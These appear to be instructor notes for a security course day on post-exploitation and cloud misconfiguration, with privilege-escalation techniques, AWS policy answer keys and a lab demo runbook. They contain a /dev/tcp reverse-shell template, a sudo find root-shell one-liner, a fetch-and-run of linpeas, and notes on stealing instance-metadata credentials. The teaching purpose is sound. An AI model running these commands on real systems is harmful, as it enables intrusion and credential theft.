# Day 17 — Teacher Notes

**Teach from:** `day17.md` (deck + speaker notes).
**This file:** cut-list, background, the policy answer keys, demo runbook, checkpoint, exit
check, FAQ.

**Heavy day, two halves.** Post-exploitation (with a hands-on priv-esc) + infra/cloud (with a
policy-fix exercise). The cut-list is real — protect the priv-esc DO, the attack-chain
artifact, shared responsibility, and the bucket/IAM DO.

---

## The analogy — inside after hours (kitchen)

Getting a shell = you're inside the restaurant after closing. Now you:
- get the **master key** — privilege escalation
- **prop a door** so you can get back in tomorrow — persistence
- move **kitchen → office → safe** — lateral movement
- borrow the restaurant's **delivery van** to reach the warehouse next door — pivoting

Cloud = a chain of restaurants sharing one supplier. The supplier locks *the building*; what's
in *your unit*, and who you give keys to, is your problem — **shared responsibility**.

---

## Must-teach vs. cut-if-short

**Never cut:**
- **Privilege escalation** (the pattern: something powerful trusts something you control) + the DO.
- The **attack-chain-with-detection** artifact (the Red→Blue bridge).
- **Shared responsibility** + the two classic cloud failures (public bucket, `*:*` IAM).
- The **bucket / IAM policy** DO.

**Cut in this order if behind:**
1. Persistence / lateral / pivoting → 4 min, name the three with one line each.
2. Infrastructure slide → a 4-min bullet run (segmentation is the one to keep).
3. The "what a shell is" slide → 2 min (reverse vs bind, then move on).
4. The Windows column of the priv-esc table → mention it mirrors Linux.

---

## Background

### Shells & post-exploitation
- **Bind shell** — the target listens; you connect. Blocked by inbound firewalls.
- **Reverse shell** — the target connects out to you. Usually works (egress is looser). `nc`,
  `bash -i >& /dev/tcp/IP/PORT 0>&1`, `python -c '...'`, `msfvenom` payloads.
- **Shell upgrade** — a raw shell has no job control / arrow keys / sudo prompt.
  `python3 -c 'import pty;pty.spawn("/bin/bash")'` then `Ctrl-Z`, `stty raw -echo; fg`.
- **Meterpreter** — Metasploit's in-memory agent: `getuid`, `sysinfo`, `hashdump`,
  `getsystem`, `migrate`, `portfwd`, `run post/...`.
- **The post-ex goals** (a.k.a. ATT&CK tactics after Initial Access): Execution, Persistence,
  Privilege Escalation, Defense Evasion, Credential Access, Discovery, Lateral Movement,
  Collection, C2, Exfiltration, Impact.

### Privilege escalation — Linux
- **SUID/SGID** abuse (Day 7) — `find / -perm -4000`; GTFOBins for how to abuse each.
- **`sudo` misconfig** — `sudo -l`; any entry that runs an editor/pager/interpreter/`find`/
  `awk`/`vim`/`less` = a root shell. `NOPASSWD` widens the window.
- **Writable files a root process trusts** — cron scripts, systemd unit files, `PATH` entries,
  `LD_PRELOAD`/`LD_LIBRARY_PATH` in a `sudo env_keep`.
- **Capabilities** — `getcap -r / 2>/dev/null`; `cap_setuid`, `cap_dac_read_search` on a
  binary = escalation.
- **Kernel exploits** — DirtyCow (2016), DirtyPipe (CVE-2022-0847), PwnKit
  (CVE-2021-4034, `pkexec`). Last resort — can panic the box.
- **Credentials on disk** — `.bash_history`, config files, `.git-credentials`, world-readable
  backups, DB config with a root password.
- Tools: **linpeas.sh**, LinEnum, linux-smart-enumeration (`lse.sh`), `pspy` (watch cron
  without root).

### Privilege escalation — Windows
- Unquoted service paths + a writable folder in the path.
- Weak service permissions (`sc qc`, `accesschk`) → change the binary path.
- `AlwaysInstallElevated` (both HKLM+HKCU set) → a malicious MSI runs as SYSTEM.
- **Token impersonation** — `SeImpersonatePrivilege` (common on service accounts) → the
  "Potato" family (JuicyPotato, PrintSpoofer, RoguePotato) → SYSTEM.
- Stored credentials — `cmdkey /list`, the Credential Manager, unattend.xml, Group Policy
  Preferences (the famous `cpassword`), `SAM`+`SYSTEM` hive dump.
- Tools: **winPEAS**, PowerUp, Seatbelt, SharpUp.

### Persistence
- Linux: cron / systemd timer, a new service, `~/.ssh/authorized_keys`, `.bashrc`,
  a SUID backdoor, a malicious PAM module, an LD_PRELOAD in `/etc/ld.so.preload`.
- Windows: Run keys, Scheduled Tasks, a new service, WMI event subscription, a DLL hijack,
  `Image File Execution Options`, a startup-folder shortcut, an added local admin.
- The IR consequence: **you reimage, you don't clean** (Day 11 rootkits).

### Lateral movement
- **Pass-the-Hash / Pass-the-Ticket** — use an NTLM hash / Kerberos ticket without knowing the
  password (Windows/AD).
- **Reused local admin password** across machines → LAPS is the fix (Day 8).
- SSH key reuse, `.ssh/config` with `ProxyJump`, agent forwarding abuse.
- Tools: `psexec`, `wmiexec`, `evil-winrm`, `crackmapexec`/`nxc`, Metasploit `pivot`.

### Pivoting
- **SSH:** `ssh -L` (local forward), `ssh -R` (remote), `ssh -D` (dynamic SOCKS proxy) +
  `proxychains`.
- **Metasploit:** `run autoroute`, `route add`, `portfwd`, `socks_proxy` module.
- The point: you attack the internal `10.0.2.0/24` *from* the compromised DMZ host that can
  reach it, even though you can't.

### Infrastructure security
- **Segmentation** — the highest-value control against lateral movement. VLANs + inter-VLAN
  ACLs; host firewalls; **zero trust** (authenticate + authorize every connection, no implicit
  trust from network location). A flat /16 where any host reaches any host = one foothold owns
  it all.
- **Firewalls** — stateful, default-deny, **egress** rules matter as much as ingress (breaks
  C2 + exfil). NGFW adds app-awareness + IPS.
- **IDS/IPS** — signature (Snort/Suricata) + anomaly. IDS alerts; IPS drops inline.
- **VPN** — encrypts transport and authenticates the endpoint; it does **not** make the remote
  device trustworthy. A stolen VPN credential = an attacker on the inside (many breaches).
- **Bastion / jump host** — the single audited doorway to a sensitive zone; MFA + session
  recording.
- **NAC**, **802.1X**, **DHCP snooping / dynamic ARP inspection** (Day 3) — control what
  plugs in.

### Cloud — shared responsibility
- **IaaS** (a VM): provider = hardware, hypervisor, physical, network backbone. You = OS
  patching, apps, data, IAM, security groups, encryption config.
- **PaaS** (managed DB, functions): provider also = the OS and the service runtime. You = data,
  access, config.
- **SaaS**: provider = almost everything technical. You = your data, your users, your access
  settings, your integrations.
- **Always yours, every model:** identity & access management, your data, and how you configure
  the service.

### The two classic cloud failures
- **Public object storage** — S3/GCS/Azure Blob left readable to "everyone" or "any AWS
  account". Root cause: a bucket policy / ACL with `Principal: *`, or public-access-block
  disabled. Fix: **S3 Block Public Access** (account + bucket), no `*` principals, use signed
  URLs for sharing.
- **Over-broad IAM** — a role/user/key with `Action: "*"`, `Resource: "*"`, or
  `AdministratorAccess`. Then: a leaked access key (in a git repo — Day 13), or an
  **SSRF → Instance Metadata Service** (`169.254.169.254`) returning the role's temporary
  credentials (Day 16). Fixes: least-privilege policies, **IMDSv2** (session-token required,
  blocks the naive SSRF), short-lived credentials / no long-lived keys, permission boundaries,
  access analyzer, CloudTrail monitoring.

---

## `bad-policy.json` — answer key

1. **Currently:** `Action: "*"` on `Resource: "*"` = the instance can do **anything** in the
   AWS account — read every bucket, launch/terminate instances, create IAM users, read
   Secrets Manager, everything.
2. **Over-grant:** both `Action` and `Resource` are `"*"`.
3. **Least privilege:**
```json
"Statement": [
  { "Sid": "ReadUploads", "Effect": "Allow",
    "Action": "s3:GetObject",
    "Resource": "arn:aws:s3:::app-uploads-prod/*" },
  { "Sid": "WriteLogs", "Effect": "Allow",
    "Action": ["logs:CreateLogStream", "logs:PutLogEvents"],
    "Resource": "arn:aws:logs:*:*:log-group:/app/web:*" }
]
```
4. **With an SSRF bug:** the attacker hits `169.254.169.254/.../iam/security-credentials/` and
   gets **this role's** temporary keys. With `*:*` that's full account takeover; with the
   least-privilege version they get read-only access to one bucket. The blast radius **is** the
   policy.

## `bad-bucket-policy.json` — answer key

1. **`Principal: "*"`** = **anyone on the internet, unauthenticated**, can `GetObject` (read
   every invoice) and `ListBucket` (enumerate every object key).
2. `ListBucket` lets an attacker discover every filename without guessing — they can pull the
   entire set. Reading individual objects requires knowing keys; listing removes that friction.
3. **Least privilege:**
```json
"Statement": [
  { "Sid": "InvoicingSvcOnly", "Effect": "Allow",
    "Principal": { "AWS": "arn:aws:iam::111122223333:role/invoicing-svc" },
    "Action": ["s3:GetObject", "s3:PutObject"],
    "Resource": "arn:aws:s3:::northwind-customer-invoices/*" }
]
```
(No `ListBucket`, no `*` principal, action scoped to `/*` objects not the bucket ARN.)
4. **S3 Block Public Access** (enabled at the account and bucket level) overrides any policy
   that would make the bucket public — a backstop against exactly this mistake.

---

## Demo runbook

### Hook
Type the `id` → `sudo -l` → `sudo find . -exec /bin/sh \; -quit` → `#` sequence on any box
where you've set `devuser ALL=(ALL) NOPASSWD: /usr/bin/find`. 20 seconds, huge impact.

### Priv-esc DO on Metasploitable2
1. Shell from Day 15 (or `msfconsole` → a quick module).
2. Host linpeas: on Kali `python3 -m http.server 8000` in the dir with `linpeas.sh`
   (Kali: `/usr/share/peass/linpeas/` or clone PEASS-ng). On target:
   `wget http://<kali-ip>:8000/linpeas.sh -O /tmp/l.sh; bash /tmp/l.sh | tee /tmp/out`.
3. Or manual: `id; sudo -l; find / -perm -4000 2>/dev/null; uname -a; cat /etc/crontab`.
4. Metasploitable2 easy roots: old kernel (`2.6.24` → many exploits), `distcc` already ran as
   `daemon` → then udev/`/etc/crontab` (world-writable, runs a script every minute → drop a
   reverse shell as root), NFS `no_root_squash`.
5. `id` → `uid=0`. Screenshot start→command→root.

### Policy DO
Paper (`assets/*.json`). If LocalStack/MinIO is set up:
`aws --endpoint-url=http://localhost:4566 s3api get-bucket-policy --bucket test` etc.

### Failure modes
| Symptom | Fix |
|---|---|
| linpeas won't transfer | `wget`/`curl` missing on target → use `nc`, or base64 paste, or manual enum |
| linpeas output is a wall | `grep` for the red/yellow "95%/99%" highlights; or teach manual enum instead |
| kernel exploit crashes Metasploitable2 | that's why we snapshot; restore; use the cron/udev path instead |
| student tries priv-esc on a non-lab box | stop — assigned lab target only |
| "we don't have a cloud account" | the policy DO is paper by design; that's fine |

---

## Checkpoint (by end of class)

Each student can:
- [ ] explain the priv-esc pattern ("something powerful trusts something you control") + name one Linux and one Windows example
- [ ] define persistence, lateral movement, and pivoting in one line each
- [ ] draw the attack chain and give one detection opportunity for three of the steps
- [ ] state what "shared responsibility" means and what is *always* the customer's job
- [ ] read a policy and spot the `"*"` over-grant

---

## Exit check (last 2 min)

1. You have a shell as `www-data`. Name two things you'd check for privilege escalation. —
   *`sudo -l`, SUID binaries, writable cron/service files, kernel version, creds in config.*
2. Your network has a firewall at the perimeter and a flat internal /16. An attacker phishes
   one laptop. What can they reach? — *Everything internal — no segmentation, so one foothold
   = the whole network.*
3. An S3 bucket policy has `"Principal": "*"`. Who can read it? — *Anyone on the internet,
   with no credentials.*

---

## FAQ

- **"Is getting a shell 'the hack'?"** It's the *start*. Real impact is what you reach from
  there — the data, the domain, the next environment.
- **"If I reimage the box, is the attacker gone?"** Only if you also killed persistence
  *everywhere* they established it and rotated every credential they could have seen. That's
  why IR (Day 19) is a process, not a reboot.
- **"Does a VPN make remote work secure?"** It encrypts the link and checks the endpoint's
  credential. It doesn't vet the device or the user's intent — a stolen VPN cred is an
  attacker inside.
- **"Isn't the cloud provider responsible if my bucket leaks?"** No — bucket configuration is
  explicitly the customer's side of shared responsibility. The provider gives you the controls
  (Block Public Access); using them is on you.
- **"IMDSv1 vs v2?"** v1: a simple GET to `169.254.169.254` returns creds → trivially
  SSRF-able. v2: requires a PUT to get a session token first → most naive SSRF can't do it.
  Enforce v2.
